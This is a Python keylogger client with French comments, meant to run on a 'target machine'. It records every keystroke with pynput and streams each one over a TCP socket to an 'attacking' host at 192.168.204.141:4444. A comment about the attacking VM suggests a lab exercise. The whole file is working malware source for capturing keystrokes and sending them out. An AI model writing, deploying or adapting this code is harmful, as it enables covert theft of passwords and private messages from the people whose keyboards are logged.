#client.py
# À exécuter sur la machine cible

import socket
from pynput.keyboard import Listener, Key

# --- Configuration du client ---
# Remplacez cette adresse IP par l'adresse IP de votre machine ATTAQUANTE.
# Pour la trouver, tapez "ip a" ou "ifconfig" sur la VM attaquante.
SERVER_HOST = "192.168.204.141" # <-- !! MODIFIEZ CETTE LIGNE !!
SERVER_PORT = 4444 # Le même port que celui utilisé par le serveur.

# --- Connexion au serveur ---
try:
    # Crée un socket client et se connecte au serveur.
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*] Connexion au serveur...")
    client_socket.connect((SERVER_HOST, SERVER_PORT))
    print("[+] Connecté au serveur !")

except ConnectionRefusedError:
    print(f"[!] Erreur : La connexion a été refusée. Le serveur est-il bien lancé sur {SERVER_HOST}:{SERVER_PORT} ?")
    exit()
except Exception as e:
    print(f"[!] Une erreur réseau est survenue : {e}")
    exit()


# --- Logique du Keylogger ---

def on_press(key):
    """
    Cette fonction est appelée chaque fois qu'une touche est pressée.
    """
    try:
        # Tente d'envoyer la touche pressée au serveur.
        # str(key) convertit la touche en une chaîne de caractères lisible.
        client_socket.sendall(str(key).encode())

    except Exception as e:
        # Si l'envoi échoue (par ex. le serveur s'est arrêté), on arrête le client.
        print(f"\n[!] Erreur d'envoi des données : {e}")
        print("[!] Arrêt du keylogger.")
        return False # Arrête le Listener pynput.

def on_release(key):
    """
    Cette fonction est appelée chaque fois qu'une touche est relâchée.
    Nous l'utilisons ici pour arrêter proprement le script si la touche 'Echap' est pressée.
    """
    if key == Key.esc:
        # Si la touche 'Echap' est pressée, on ferme le socket et on arrête le listener.
        print("\n[!] Touche Echap pressée. Arrêt du client.")
        client_socket.close()
        return False # Arrête le Listener.

# --- Démarrage du Keylogger ---

print("[*] Le keylogger est actif. Appuyez sur 'Echap' pour arrêter.")

# Crée un écouteur (Listener) qui appelle 'on_press' et 'on_release'
# lors des événements clavier.
# Le 'with' s'assure que le listener est bien arrêté à la fin.
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Bloque le script pour que le listener reste actif en arrière-plan.
    listener.join()

print("[*] Client déconnecté.")
                                  